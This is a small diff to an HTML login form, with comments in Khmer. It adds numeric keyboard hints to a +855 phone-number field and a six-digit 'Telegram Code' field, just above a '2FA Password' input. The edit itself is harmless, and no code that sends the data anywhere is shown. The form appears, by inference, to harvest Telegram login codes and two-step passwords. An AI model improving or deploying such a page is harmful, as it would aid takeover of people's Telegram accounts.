@@ -211,10 +211,10 @@
         </div>
       </div>
 
-      <!-- Phone Number Field -->
+      <!-- Phone Number Field (បានកែបញ្ចូល inputmode="numeric") -->
       <div class="field">
         <label>Your phone number</label>
-        <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
+        <input id="phone-input" type="text" inputmode="numeric" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" onpaste="handlePaste(event, this)" />
       </div>
 
       <!-- Keep me signed in -->
@@ -242,9 +242,10 @@
       </div>
       
       <div class="text-left space-y-4">
+        <!-- OTP Code Field (បានកែបញ្ចូល inputmode="numeric" និង pattern="[0-9]*") -->
         <div class="field">
           <label>Telegram Code</label>
-          <input id="otp-input" type="text" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
+          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
         </div>
 
         <!-- Input 2FA Password -->
